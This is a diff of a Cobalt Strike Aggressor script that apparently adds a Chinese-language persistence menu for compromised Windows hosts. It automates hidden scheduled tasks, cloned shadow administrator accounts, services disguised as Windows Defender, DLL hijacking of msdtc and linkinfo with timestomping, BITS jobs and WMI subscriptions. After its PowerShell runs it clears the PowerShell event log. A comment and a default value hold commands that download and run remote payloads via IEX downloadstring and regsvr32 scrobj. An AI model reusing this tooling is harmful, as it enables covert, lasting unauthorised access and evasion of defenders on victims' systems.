@@ -1,7 +1,35 @@
 menu "☆ 权限维持"{
+    item "SharpSchTask" {
+        blog($1, "\c9=========== SharpSchTask ==========");
+        $bid = $1['@'];
+        $dialog = dialog("SharpSchTask (.NET 2.0)", %(exec => "C:\\Windows\\Temp\\cmd.exe 1",bid => $bid), &SharpSchTask);
+        dialog_description($dialog, "利用 Windows API，工具化创建隐藏的计划任务，同时绕过安全软件的阻断，达到持久控制。");
+        drow_text($dialog, "exec", "参数：");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+    }
+
+    sub SharpSchTask{
+        $arg = join(' ', @($3['exec']));
+        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintainSchTask.exe"), $arg);
+    }
+    item "SharpShadowUser" {
+        blog($1, "\c9=========== SharpShadowUser ==========");
+        $bid = $1['@'];
+        $dialog = dialog("SharpShadowUser (.NET 2.0)", %(exec => "Shadow Administrator",bid => $bid), &SharpShadowUser);
+        dialog_description($dialog, "Bypass 远程内存加载克隆影子用户");
+        drow_text($dialog, "exec", "参数：");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+    }
+
+    sub SharpShadowUser{
+        $arg = join(' ', @($3['exec']));
+        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintainShadowUser.exe"), $arg);
+    }
+	
 	menu "EasyPersistent" {
 		item "设置常用路径" {
-			blog($1, "\c9=========== 设置常用路径 ==========");
 			local('$bid');
 			foreach $bid ($1){
 				prompt_text("文件路径?", $filePath, {
@@ -15,10 +43,8 @@ menu "☆ 权限维持"{
 				});
 			}
 		}
-
 		menu "文件控制"{  
 			item "文件属性" {
-			blog($1, "\c9=========== 文件属性 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("文件属性控制 attrib",%(filePath => $filePath, Action => "属性查看",bid => $bid),lambda({
@@ -50,8 +76,7 @@ menu "☆ 权限维持"{
 					dialog_show($Dialog);
 			}}
 			
-			item "文件权限" {
-			blog($1, "\c9=========== 文件权限 =========="); 
+			item "文件权限" { 
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -86,7 +111,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "文件链接" {
-			blog($1, "\c9=========== 文件链接 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -119,7 +143,7 @@ menu "☆ 权限维持"{
 			item "添加注册表启动项"{
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => binfo($bid, "arch") ,  KeyName => "Svchost", CallBackFile => "$filePath" ,bid => $bid),&AddRegAutoRun);
+					$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => binfo($bid, "arch") , KeyName => "Svchost", CallBackFile => "$filePath" ,bid => $bid),&AddRegAutoRun);
 					dialog_description($Dialog, "注册表添加启动项");
 					drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
 					drow_combobox($Dialog, "Arch", "Arch: ", @("x86", "x64"));
@@ -201,11 +225,10 @@ menu "☆ 权限维持"{
 
 		menu "系统服务" {
 			item "添加服务" {
-			blog($1, "\c9=========== 添加服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
-					$filePath = "C:\\windows\\Temp\\".randomFileName().".exe";
-					$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName() , displayname => "1_".randomFileName() , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "自启动",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName().".exe",setsddl => "显示服务", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
+					$filePath = "C:\\windows\\Temp\\".randomFileName(6).".exe";
+					$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName(6) , displayname => "1_".randomFileName(6) , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "自启动",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName(6).".exe",setsddl => "显示服务", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
 					dialog_description($Dialog, "添加服务,如果是非服务的程序需要使用:cmd /c start xxx 或者 rundll32 xxx.dll;服务程序用来接受SCM的控制,提供了两个服务程序，一个为正常启动的服务用于执行载荷；另一个只会返回失败，用来作为启动失败回调的服务。");
 					drow_text($Dialog, "servicename", "服务名称: ");
 					drow_text($Dialog, "serviceFile", "服务程序: ");
@@ -223,7 +246,6 @@ menu "☆ 权限维持"{
 			}
 
 			item "修改服务" {
-			blog($1, "\c9=========== 修改服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Servers Auto Run",%(servicename => "Wdfup", displayname => "Windows Defender Antivirus Update Service", binpath => "$filePath" ,description => "Windows Defender kernel support.",bid => $bid),&ChangeAutoService);
@@ -238,7 +260,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "设置SDDL" {
-			blog($1, "\c9=========== 设置SDDL ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Edit Service SDDL",%(servicename => "Wdfup",SDDL => "隐藏",bid => $bid),&HiddenService);
@@ -252,7 +273,6 @@ menu "☆ 权限维持"{
 			
 			#移除注册表, sc 删除
 			item "删除服务" {
-			blog($1, "\c9=========== 删除服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",bid => $bid),&DeleteService);
@@ -264,7 +284,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "查询服务" {
-			blog($1, "\c9=========== 查询服务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",type => "all",state => "active",qtype => "query",bid => $bid),&QService);
@@ -278,52 +297,86 @@ menu "☆ 权限维持"{
 				}
 			}
 		}
-
 		menu "用户操作" {
-			item "查询用户" {
-				blog($1, "\c9=========== 查询用户 ==========");
+			item "查询账户" {
 				local('$bid');
 				foreach $bid ($1){
-					bnet($bid, "user");
-					#blog($bid, "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
-					#bshell($bid, "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
+					$Dialog = dialog("查询账户",%(user => "test",localgroups => "Administrators",addtype => "NET", bid => $bid),lambda({
+						if($3['user'] eq ""){
+							if($3['addtype'] eq "NET" ){
+								blog($3['bid'],"net1 user");
+								bshell($3['bid'],"net1 user");	
+							}
+							if($3['addtype'] eq "BNET" ){
+								bnet($3['bid'], "user");
+							}
+							if($3['addtype'] eq "API" ){
+								local('$Parameter $bid');
+								$bid = $3['bid'];
+								$Parameter = "GetGroupUsers"."|1|1|".$3['localgroups']."|1";
+								blog($bid,"$Parameter");
+								bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
+							}
+							if($3['addtype'] eq "REG" ){
+								blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
+								bshell($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
+							}
+						}else{
+							if($3['addtype'] eq "NET" ){
+								blog($3['bid'],"net1 user $3['user'] ");
+								bshell($3['bid'],"net1 user $3['user'] ");	
+							}
+							if($3['addtype'] eq "BNET" ){
+								bnet($3['bid'], "user", "\\\\127.0.0.1" ,$3['user']);
+							}
+							if($3['addtype'] eq "API" ){
+								local('$Parameter $User $bid');
+								$bid = $3['bid'];
+								$User = $3['user'];
+
+								$Parameter = "QueryUserInfo"."|".$User."|1|1|1";
+								blog($bid,"$Parameter");
+								bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
+								
+							}
+							if($3['addtype'] eq "REG" ){
+								blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$3['user']");
+								bshell($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$3['user']");
+							}
+						}
+					
+						
+					}));
+					dialog_description($Dialog, "查询账户（使用API，账户参数为空时根据组查询全部用户；查询指定账户时，组名参数会被忽略）。其他用户提示:administrator,Guest;本地组查询：net localgroup");
+					drow_text($Dialog, "user", "账户名称: ");
+					drow_combobox($Dialog, "localgroups", "选择账户组: ", @("Users","Guests","Administrators","Remote Desktop Users","Remote Management Users","System Managed Accounts Group",)); 
+					drow_combobox($Dialog, "addtype", "查询方式: ", @("NET","BNET","API","REG"));
+					dbutton_action($Dialog, "查询");
+					dbutton_help($Dialog, "https://www.qq.com");
+					dialog_show($Dialog);
 				}
 			}
 			
 			item "添加用户" {
-				blog($1, "\c9=========== 添加用户 ==========");
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("添加用户",%(user => "Yanghao",pass => "Yanghao@123$",localgroups => "Administrators",addtype => "NET",bid => $bid),&AdUser);
-					dialog_description($Dialog, "添加用户");
+					$Dialog = dialog("添加新用户到组",%(user => "xasda",pass => "test@123",localgroups => "Administrators",comment => "",addtype => "API",bid => $bid),&AdUser);
+					dialog_description($Dialog, "添加用户，密码中不要包含\$，否则容易出bug.");
 					drow_text($Dialog, "user", "账户名称: ");
 					drow_text($Dialog, "pass", "账户密码: ");
+					drow_text($Dialog, "comment", "账户描述: ");
 					drow_combobox($Dialog, "localgroups", "加入的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
-					drow_combobox($Dialog, "addtype", "添加方式: ", @("NET","API"));
+					drow_combobox($Dialog, "addtype", "添加方式: ", @("NET","API","SpoofArg"));
 					dbutton_action($Dialog, "AdUser");
 					dialog_show($Dialog);
 				}
 			}
 			
-			item "克隆用户" {
-				blog($1, "\c9=========== 克隆用户 ==========");
-				local('$bid');
-				foreach $bid ($1){
-					$Dialog = dialog("CloneUser",%(user => "Yanghao",pass => "Yanghao@123$",cloneuser => "Administrator",bid => $bid),&CloneUser);
-					dialog_description($Dialog, "用户克隆");
-					drow_text($Dialog, "user", "账户名称: ");
-					drow_text($Dialog, "pass", "账户密码: ");
-					drow_text($Dialog, "cloneuser", "被克隆用户: ");
-					dbutton_action($Dialog, "CloneUser");
-					dialog_show($Dialog);
-				}
-			}
 			
 			item "删除用户" {
-				blog($1, "\c9=========== 删除用户 ==========");
 				local('$bid');
 				foreach $bid ($1){					
-					$Dialog = dialog("User Delete",%(user => "Yanghao",type => "NET",bid => $bid),&DeleteUser);
+					$Dialog = dialog("User Delete",%(user => "test",type => "NET",bid => $bid),&DeleteUser);
 					dialog_description($Dialog, "用户删除");
 					drow_text($Dialog, "user", "账户名称: ");
 					drow_combobox($Dialog, "type", "执行方式: ", @("NET","API"));
@@ -332,15 +385,15 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "用户激活与禁用" {
-				blog($1, "\c9=========== 用户激活与禁用 ==========");
+			item "修改账户" {
 				local('$bid');
 				foreach $bid ($1){
-					$Dialog = dialog("禁用/激活用户",%(user => "Guest",pass => "Yanghao@123$",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&EnGuest);
-					dialog_description($Dialog, "禁用/激活用户：1(enable).激活用户后设置密码,加入组;2(disabled).移除用户组,禁用用户;3(移除组).从特定组中移除账户。注意:Win10激活Guest无法直接用于登录。");
+					$Dialog = dialog("修改账户",%(user => "Guest",pass => "test@123$",comment => "",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
+					dialog_description($Dialog, "1(enable).激活账户后设置密码并加入组（如果账户不存在会失败,存在的账户描述信息不会被修改）;2(disabled).移除用户组,禁用用户;3(移除组).从特定组中移除账户。注意:Win10激活Guest无法直接用于登录。");
 					drow_text($Dialog, "user", "账户名称: ");
 					drow_text($Dialog, "pass", "账户密码: ");
-					drow_combobox($Dialog, "localgroups", "操作的组: ", @("Administrators","Remote Desktop Users","Users"));  # net localgroup
+					drow_text($Dialog, "comment", "账户描述: ");
+					drow_combobox($Dialog, "localgroups", "操作的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
 					drow_combobox($Dialog, "addtype", "执行方式: ", @("NET","API"));
 					drow_combobox($Dialog, "DoFt", "执行方法: ", @("enable","disabled","removeGroup"));
 					dbutton_action($Dialog, "执行");
@@ -351,7 +404,6 @@ menu "☆ 权限维持"{
 
 		menu "启动目录" {
 			item "查询启动目录" {
-				blog($1, "\c9=========== 查询启动目录 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -373,7 +425,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "写入启动目录" {
-				blog($1, "\c9=========== 写入启动目录 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -417,7 +468,7 @@ menu "☆ 权限维持"{
 				sleep(3000);
 				blog($bid,"Done.");
 			}else if($Type eq "API重启写入"){		
-				$TempFile = "C:\\Windows\\Temp\\".randomFileName().".exe";
+				$TempFile = "C:\\Windows\\Temp\\".randomFileName(6).".exe";
 				blog($bid,"Upload $PersistentFile To $TempFile");
 				bupload_raw($bid, $TempFile, readb(openf($PersistentFile), -1));
 				blog($bid,"Sleep 3s");
@@ -425,13 +476,12 @@ menu "☆ 权限维持"{
 				blog($bid,"Use API MoveFileEx $TempFile to ".$UploadPath.$RemoteFileName);
 				$Parameter = $TempFile . "|" . $UploadPath.$RemoteFileName;	
 				$Data = pack("I-", 3) .$Parameter; #?  怎么用C++构造函数传递多个参数
-				bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/StartUp/reflective_dll.dll"),$Data, "Move File", 5000);
+				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/StartUp/reflective_dll.dll"),$Data, "Move File", 5000);
 			}
 		}
-
+		# https://www.coder.work/article/562756   计划任务命令行中使用单引号。 shell SCHTASKS /Create /TN \Tempaa /TR "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\\\"http://192.168.200.191:8060/a22\\\"))\"" /RU Administrator /SC ONCE /ST 18:16 /RL HIGHEST /F
 		menu "计划任务"{
 			item "查询计划任务" {
-				blog($1, "\c9=========== 查询计划任务 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("添加计划任务",%(taskname => "MicrosoftEdgeUpdateTaskMachineCore" , bid => $bid) ,lambda({
@@ -458,7 +508,6 @@ menu "☆ 权限维持"{
 			}
 
 			item "AddCmdLine" {
-				blog($1, "\c9=========== AddCmdLine ==========");
 				local('$bid $user $taskname $level $is_admin');
 				foreach $bid ($1){
 					#如果是系统账户会忽略密码,用户要输入密码。/RU选项是为了方便从管理员到SYSTEM和SYSTEM创建任务。
@@ -499,7 +548,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "Add-TaskAPI" {
-				blog($1, "\c9=========== Add-TaskAPI ==========");
 				local('$bid $user $taskname $level $is_admin');
 				foreach $bid ($1){
 					#如果是系统账户会忽略密码,用户要输入密码。/RU选项是为了方便从管理员到SYSTEM和SYSTEM创建任务。
@@ -548,7 +596,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "删除计划任务" {
-				blog($1, "\c9=========== 删除计划任务 ==========");
 				local('$bid $user $taskname');
 				foreach $bid ($1){
 					$user = replace(beacon_info($bid, "user"), " \\*", "");
@@ -759,9 +806,6 @@ menu "☆ 权限维持"{
 			}else{
 				show_error("0");
 			}
-		# if(立即执行)
-		# blog($bid , "SCHTASKS /Run /TN $taskname");
-		# bshell($bid , "SCHTASKS /Run /TN $taskname");	
 
 		}
 
@@ -781,7 +825,7 @@ menu "☆ 权限维持"{
 				$Runtime = "2020-05-20T05:20:00";
 				$Parameter = $taskname . "|" . URLencode(replace($taskinfo,' ',''))  . "|" .$taskrun. "|" .$runuser. "|" .$CreateIs."|".$Runtime."|".$dotype;	
 				$Data = pack("I-", 2) .$Parameter;
-				bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
+				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
 			}else{   #每天在设置的时间执行，每周5执行，每月13号执行
 				if($Runtime eq ""){
 					$Dialog = dialog("设置计划任务开始时间",%(taskname => $taskname,taskinfo => $taskinfo,taskrun => $taskrun,runuser => $runuser,dotype => $dotype,CreateIs => $CreateIs,Runtime => (formatDate((ticks()+(1000 * 30)),"yyyy-MM-dd'T'HH:mm:ss")),bid => $bid),&AddSchtasks_API);
@@ -795,11 +839,10 @@ menu "☆ 权限维持"{
 					blog($bid , "Add $dotype Schtasks,Taskname is:$taskname");
 					$Parameter = $taskname . "|" . URLencode(replace($taskinfo,' ','')) . "|" .$taskrun. "|" .$runuser. "|" .$CreateIs."|".$Runtime."|".$dotype;	
 					$Data = pack("I-", 2) .$Parameter;
-					bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
+					bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Task_Scheduler/reflective_dll.dll"),$Data, "AddSchtasks_API ", 5000);
 				}
 			}
 		}
-
 
 		sub DelSchtasks {
 			local('$bid $taskname $type');
@@ -812,11 +855,9 @@ menu "☆ 权限维持"{
 			}
 		}
 
-
 		menu "DLL加载"{
 			menu "Msdtc" {
 				item "上传oci.dll" {
-					blog($1, "\c9=========== 上传oci.dll ==========");
 					local('$bid');
 					foreach $bid ($1){
 					#选择cs自动生成的，选择本地存在的，
@@ -831,7 +872,7 @@ menu "☆ 权限维持"{
 							sleep(3000);
 							
 							$NewFile = "C:\\windows\\system32\\oci.dll";
-							$TempFile = "C:\\Windows\\Temp\\".randomFileName();
+							$TempFile = "C:\\Windows\\Temp\\".randomFileName(6);
 							blog($bid,"Upload ".$ociFile." to $TempFile ");	
 							$handle = openf($ociFile);
 							$bdata   = readb($handle, -1);
@@ -839,7 +880,7 @@ menu "☆ 权限维持"{
 							bupload_raw($bid,$TempFile,$bdata);
 							btimestomp($bid, $TempFile, "C:\\windows\\regedit.exe");
 							$Data = "1 $TempFile $NewFile";
-							bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
+							bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
 							
 							blog($bid,"sc config msdtc start= auto obj= LocalSystem");
 							brun($bid,"sc config msdtc start= auto obj= LocalSystem");
@@ -853,22 +894,21 @@ menu "☆ 权限维持"{
 					}
 				}
 
-				# MoveFileEx.dll  D:\ActivePart\Code\VS2019\CobaltStrike_script\Persistence\MSDTC
-				item "清理oci.dll" {
-					blog($1, "\c9=========== 清理oci.dll ==========");
+				# MoveFileEx.dll  D:\xxx\CobaltStrike_script\Persistence\MSDTC
+				item "清理oci.dll"{
 					local('$bid $ociFile $Data');
 					$ociFile = "C:\\windows\\system32\\oci.dll";
 					foreach $bid ($1){
 						if( binfo($bid, "process") eq "msdtc.exe"){
 							blog($bid , "File will be deleted after restart.");
 							$Data = "2 $ociFile $ociFile";
-							bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
+							bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
 						}else{
 							blog($bid , "Will Stop msdtc Service.");
 							blog($bid , "sc stop msdtc");
 							brun($bid , "sc stop msdtc");
 							$Data = "0 $ociFile $ociFile";
-							bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
+							bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Msdtc32/reflective_dll.dll"),$Data, "Move File", 6000);
 							blog($bid , "sc start msdtc");
 							brun($bid , "sc start msdtc");
 						}
@@ -878,8 +918,7 @@ menu "☆ 权限维持"{
 			
 			# https://www.cnblogs.com/websecyw/p/12561630.html
 			menu "Linkinfo" {
-				item "上传linkinfo.dll" {
-					blog($1, "\c9=========== 上传linkinfo.dll ==========");
+				item "上传linkinfo.dll"{
 					local('$bid');
 					foreach $bid ($1){
 						#binput($bid, "blockdlls start"); 
@@ -905,8 +944,7 @@ menu "☆ 权限维持"{
 					}
 				}
 				
-				item "清理linkinfo.dll" {
-					blog($1, "\c9=========== 清理linkinfo.dll ==========");
+				item "清理linkinfo.dll"{
 					local('$bid $TempFile');
 					$TempFile = "C:\\windows\\linkinfo.dll";
 					foreach $bid ($1){
@@ -916,7 +954,7 @@ menu "☆ 权限维持"{
 						blog($bid, "-------".getnow()."-------");
 						blog($bid , "The file will be delete after restart.");
 						$Data = "2 C:\\windows\\linkinfo.dll 1";
-						bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain/"), "/Linkinfo/reflective_dll.dll"),$Data, "Del linkinfo.dll after reboot.", 5000);
+						bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/Linkinfo/reflective_dll.dll"),$Data, "Del linkinfo.dll after reboot.", 5000);
 					}
 				}
 			}
@@ -949,9 +987,8 @@ menu "☆ 权限维持"{
 		}
 		}
 
-		menu "BITS任务" {
-			item "添加任务" {
-				blog($1, "\c9=========== 添加任务 ==========");
+		menu "BITS任务"{
+			item "添加任务"{
 				local('$bid');
 				foreach $bid ($1){
 					$dialog = dialog("Bitsadmin 持久化", %(JobName => "WindowsUpdate", CmdLine => "regsvr32.exe /u /s /i:http://192.168.11.1:80/download/calc.sct scrobj.dll" ,bid => $bid), &bitsadmin);
@@ -963,8 +1000,7 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "查询任务" {
-				blog($1, "\c9=========== 查询任务 ==========");
+			item "查询任务"{
 				#获取任务创建时间 bitsadmin /GetCreationTime <Job>
 				local('$bid');
 				foreach $bid ($1){
@@ -993,8 +1029,7 @@ menu "☆ 权限维持"{
 				}
 			}
 			
-			item "删除任务" {
-				blog($1, "\c9=========== 删除任务 ==========");
+			item "删除任务"{
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("删除任务", %(JobName => "WindowsUpdate", bid => $bid), lambda({
@@ -1026,7 +1061,6 @@ menu "☆ 权限维持"{
 		#WMI Event Subscription
 		menu "WMI事件" {
 			item "注册事件订阅" {
-				blog($1, "\c9=========== 注册事件订阅 ==========");
 				local('$bid');
 				foreach $bid ($1){	
 					$Dialog = dialog("WMI注册", %(EventFilterName => "WindowsUpdate_".ticks(), EventConsumerName => "DownLoader_" .ticks(), RunType => "CommandLine" , Trigger => "Timed", bid => $bid) ,  &RegWMI );
@@ -1041,7 +1075,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "检查事件订阅" {
-				blog($1, "\c9=========== 检查事件订阅 ==========");
 				local('$bid');
 				foreach $bid ($1){
 					$Dialog = dialog("查看WMI事件订阅", %(NamespaceName => "root/subscription" , EventFilterName => "", EventConsumerName => "", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
@@ -1056,30 +1089,30 @@ menu "☆ 权限维持"{
 							if($EventFilterName eq "" ){
 								if($EventConsumerName eq ""){
 									blog($bid, "Show All $RunType"."EventConsumer"." WMI Event Subscriptions.");
-									bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo");
 									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 								}else{
 									blog($bid, "Show $RunType"."EventConsumer"." WMI Event Subscriptions. Consumer: $EventConsumerName");
-									bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo -EventConsumerName $EventConsumerName");
 									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 								}
 							}else if($EventConsumerName eq ""){
 								if($EventFilterName eq ""){
 									blog($bid, "Show All $RunType"."EventConsumer"." WMI Event Subscriptions.");
-									bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo");
 									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 								}else{
 									blog($bid, "Show $RunType"."EventConsumer"." WMI Event Subscriptions. Filter: $EventFilterName");
-									bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+									bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 									bpowerpick($bid,"ShowEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo -EventFilterName $EventFilterName");
 									bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 								}
 							}else{
 								blog($bid, "Show WMI Event Subscription");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"ShowEventSubscription -RunType $RunType -NamespaceName $NamespaceName -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -BindingTo $BindingTo");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}	
@@ -1100,7 +1133,6 @@ menu "☆ 权限维持"{
 			}
 			
 			item "删除事件订阅" {
-				blog($1, "\c9=========== 删除事件订阅 ==========");
 				local('$bid');
 				foreach $bid ($1){	
 					$Dialog = dialog("删除WMI事件订阅", %(NamespaceName => "root/subscription" , EventFilterName => "WindowsUpdate", EventConsumerName => "DownLoader", bid => $bid , BindingTo => 'Like', RunType => "CommandLine"), lambda({
@@ -1114,14 +1146,14 @@ menu "☆ 权限维持"{
 					if (-isadmin $bid){
 						if($EventFilterName eq "" || $EventConsumerName eq ""  ){
 							blog($bid, "Remove All $RunType"."EventConsumer"." WMI Event Subscriptions.");
-							bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+							bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 							bpowerpick($bid,"CleanEventSubscription -NamespaceName $NamespaceName -RunType $RunType -BindingTo $BindingTo");
 							bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 						}
 						else
 						{
 							blog($bid, "WMI_Remove_Persistence");
-							bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+							bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 							bpowerpick($bid,"CleanEventSubscription -RunType $RunType -NamespaceName $NamespaceName -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -BindingTo $BindingTo");
 							bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 						}	
@@ -1184,7 +1216,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI ProcessStart Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -ProcessName $ProcessName");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1200,7 +1232,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI InsertUSB Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}
@@ -1217,7 +1249,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
 							}else{
 								blog($bid, "WMI $Trigger Event Install");
-								bpowershell_import($bid, script_resource("Persistence/Modules/Wmi/Wmi_Persistence.ps1"));
+								bpowershell_import($bid, script_resource("scripts/AuthMaintainWmi/Wmi_Persistence.ps1"));
 								bpowerpick($bid,"RegEventSubscription -Trigger $Trigger -RunType $RunType -EventFilterName $EventFilterName -EventConsumerName $EventConsumerName -CommandLineTemplate $CommandLineTemplate -UserName $UserName -Domain $Domain");
 								bshell($bid,"wevtutil cl \"Windows PowerShell\"");
 							}                                                                                                                               
@@ -1234,7 +1266,7 @@ menu "☆ 权限维持"{
 								dialog_show($Dialog);
